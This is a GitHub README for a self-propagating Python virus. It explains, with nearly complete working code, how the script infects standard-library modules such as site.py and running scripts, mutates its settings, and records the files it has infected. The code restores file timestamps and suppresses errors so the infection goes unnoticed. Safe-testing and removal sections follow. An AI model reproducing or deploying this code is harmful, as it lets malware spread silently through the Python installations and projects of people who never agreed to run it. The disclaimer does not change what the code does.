[English | [简体中文](https://github.com/pypy66/python-self-replication/blob/main/README_chs.md)]

A simple Python virus that spreads through .py files and can mutate itself, NOT permitted for illegal use!  

## Program Principle

This project implements a Python script with **self-propagation** and **mutation** capabilities.  
Main functionalities:
1. **Extract self-code**: Reads the current script file and extracts the code segment marked by specific tags.
2. **Check propagation conditions**: Verifies if the target file meets propagation conditions (e.g., file size, whether it already contains the script).
3. **Gene mutation**: Randomly mutates core configuration parameters during propagation.
4. **Propagate code**: Appends the mutated gene and script code to the target file.
5. **Propagation history and count tracking**: Updates the record of infected files, embedding the "memory" into the script's genes.

Below is an introduction to the execution process of the latest version, `worm_v3.py`.

### 1. **Initialization Markers**
The program first defines a `genes` dictionary and a marker string `mark`:
```python
genes = {'minsize': 3072, 'target_mod': 'site', 'cnt': 0, 'memory': []}
mark = "#####MyPython####"  # Unique identifier
```
- **Gene `genes`**:
  - `minsize`: Minimum size of the target file (in bytes). The script propagates only if the file size exceeds this value.
  - `target_mod`: Target module name. The script attempts to append itself to the source file of this module.
  - `cnt`: Tracks the number of times the script has propagated.
  - `memory`: Records modified files as part of the embedded "memory" in the genes.
- **`mark`**: A unique identifier for the script, used to detect whether the target file has already been infected and to locate the script's code in the source file.

### 2. **Extract Self-Code**
The script reads its own code using the `find_code` function:
```python
def find_code(file):
    code = ''
    with open(file, encoding="utf-8") as f:
        for line in f:
            if mark in line.strip():
                code = line + f.read()
    return code
```
- Opens the current script file (`__file__`).
- Searches for the line containing `mark`, identifying the starting location of the script.
- Extracts all code from the marker line onward.

### 3. **Propagation Logic**
**Propagation to a file** (function `spread_to_file`):
```python
def spread_to_file(file, code):
    import os; stat = os.stat(file)
    old_time = stat.st_atime, stat.st_mtime
    with open(file, 'r', encoding='utf-8') as f:
        for line in f:
            if mark in line: return
    if os.path.getsize(file) >= genes['minsize']:
        backup = genes['memory'].copy()
        add_memory(genes, os.path.split(file)[1])
        with open(file, 'a', encoding='utf-8') as f:
            f.write('\ngenes=%r\n' % mutate(genes))
            f.write(code)
        os.utime(file, old_time)
        genes['memory'] = backup
```
- If the `mark` is already present in the target file or the file size is less than `minsize`, propagation is terminated.
- Otherwise:
    - Calls `mutate` to mutate the genes.
    - Appends the mutated genes and script code to the target file.
    - Uses `os.utime` to restore the file's original modification date, avoiding leaving traces of propagation.

**Propagation to a module** (function `spread`):
```python
def spread(mod, code):
    spread_to_file(__import__(mod).__file__, code)
```
- Dynamically loads the module using the built-in `__import__` function.
- Retrieves the module's source file path and calls `spread_to_file` to append the script to the module's source file.

### 4. **Gene Mutation**
During propagation, the script calls the `mutate` function to manually mutate its genes:
```python
def mutate(gene):
    import sys, random as r
    mut = gene.copy()
    mut['memory'] = gene['memory'].copy()
    if r.random() < 0.2:
        mut['minsize'] = max(1500, mut['minsize'] + round(r.gauss(0, 80)))
    if (r.random() < 0.1 if '__name__' == '__main__' else r.random() < 0.01):
        mod = None
        while not (hasattr(sys.modules.get(mod), '__file__') \
                   and sys.modules[mod].__file__.lower().endswith('.py')):
            mod = r.choice(list(sys.modules))
        mut['target_mod'] = mod
    return mut
```
- **Mutation rules**:
  - 20% probability to adjust `minsize`, changing the file size threshold.
  - Randomly changes `target_mod` to select another Python module as the propagation target. If the main program (`__name__=='__main__'`) is running, the mutation probability is higher because more modules are loaded into `sys.modules`.
- Gene mutation alters the script's behavior, simulating the evolutionary mechanism of natural selection.

### 5. **Memory Mechanism**
The script implements the `add_memory` function to track propagation history, propagation count, and other information. This is similar to the "memory" of real organisms and is currently used for debugging. In the future, the script may make decisions based on its memory!
```python
def add_memory(gene, item):
    import sys, os
    mem = gene['memory']
    mem.append(item)
    gene['cnt'] += 1
    size = sum(len(item) for item in mem)
    maxsize = 40
    while mem and size > maxsize:
        size -= len(mem.pop(0))
```
- Records the filenames of infected files during each propagation.
- If the total size exceeds the `maxsize` limit, the earliest records are deleted, simulating the "forgetting" mechanism of real organisms.
- Each propagation increments `gene['cnt']`, ensuring the total count persists even if the earliest records are "forgotten."

### 6. **Main Program**
The main program of the script:
```python
try:
    code = find_code(__file__)  # Extract self-code
    spread(genes['target_mod'], code)  # Propagate to target module
    spread_to_file(__import__('sys').argv[0], code)  # Propagate to the current script
except:pass
del find_code,add_memory,mutate,spread,spread_to_file,genes,mark
try:del code
except NameError:pass
```
- Firstly, extracts its own code.
- Propagates to the target module (`genes['target_mod']`) and the current entry file (`sys.argv[0]`).
- `except:pass` prevents errors from being output, which could lead to the program being detected.
- Cleans up all defined functions and variables after completion to avoid polluting the namespace of modules like `site`.

~~**Differences Between Code and Biological Viruses**~~  

This Python virus must be stored in `.py` files to function. `.py` files are analogous to the protein shell of a biological virus, containing the virus's genetic material.  
When the interpreter parses and executes the infected Python file, it is akin to the virus entering a cell and gaining the ability to propagate.  
`spread("site")` embeds the code into the standard library, similar to the reverse transcription process of viruses.  
`spread_to_file(__import__("sys").argv[0])` propagates the code to the currently running `.py` file, effectively creating a new virus. The newly infected `.py` file acts as the protein shell of the new virus.  

As for genes, both real viruses and the script implement their respective genes and mutation mechanisms. The script's `genes` only control the virus's behavior without implementing functionality, whereas real viruses' genes include functional implementations.  
Additionally, the script's `mutate` function can only mutate the data portion (`genes`) and not the code, whereas real viruses can mutate their entire genome.

## Version History

- `worm_v1.py`: The earliest prototype, capable of propagating to non-essential modules of the Python interpreter.
- `worm_v2.py`: Replaced `__main__` with `sys.argv[0]`, enabling the script to locate the main script executed by the Python interpreter.
- `worm_v2_1.py`: Automatically parses the `-m` command-line parameter (per the [official documentation](https://docs.python.org/3.7/using/cmdline.html#cmdoption-m), when the Python interpreter is started with `-m`, `sys.argv[1]` is set to `-m`, but the specific module name is not included in `sys.argv`, so the system API is used to directly retrieve the module name from the command-line arguments).
- `worm_v3.py`: The latest version, with the addition of "genes," mutation, and memory functionality.
- `worm_v3_no_comments.py`: Identical to `worm_v3.py` but without comments, reducing file size.

## How to Safely Test

**Windows**:  
First, open the installation directory of the Python interpreter, select the `Lib` folder, and press `Ctrl+C` and `Ctrl+V` to create a copy of the standard library directory.  
After testing, delete the infected `Lib` directory and rename the copied `Lib - Copy` back to `Lib`.  
![](https://i-blog.csdnimg.cn/direct/ae46508354c2476f8fc9b6c9c90ee00b.png)

The steps for other operating systems are similar to those for Windows.

## How to Completely Remove This Program

Most antivirus software primarily targets executable files such as `.exe` and `.dll`, as well as some popular script-based viruses like VBA macro viruses or VBS viruses.  
Since Python interpreters are not commonly installed by the average user, Python script viruses are rare, and antivirus software generally does not scan `.py` files.

To resolve this without reinstalling the Python interpreter, follow these steps:
1. Install and open the [Everything](https://www.voidtools.com/) software.
2. Open the "Search" => "Advanced Search" menu and input the following keywords:  
![](https://i-blog.csdnimg.cn/direct/70e38466919e4cf9b5d844956b3a46c3.png)

After a while, edit the infected Python files (e.g., `site.py`) found by the search and remove the script code appended at the end of the file.

